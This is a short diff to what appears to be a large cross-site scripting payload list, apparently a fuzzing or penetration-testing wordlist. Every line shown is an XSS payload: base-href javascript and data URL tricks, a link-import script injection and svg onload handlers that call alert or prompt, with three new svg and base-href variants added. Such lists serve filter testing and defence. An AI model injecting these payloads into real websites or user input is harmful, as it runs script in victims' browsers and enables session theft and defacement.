@@ -1163,4 +1163,7 @@ data:text/html,<script>alert(document.domain)</script>
 <base href="javascript:\"> <a href="//%0aalert(5);//">
 <svg/onload=prompt&#40;1)
 <base href="javascript:/"><a href="**/alert(1)">
+<base href="data:\"><link rel=import href='q,<script>alert(1)</script>'>
+<svg onload=1?alert(9):0>
+<svg onload=0?1:alert(9)>
 /* RFI STOP */
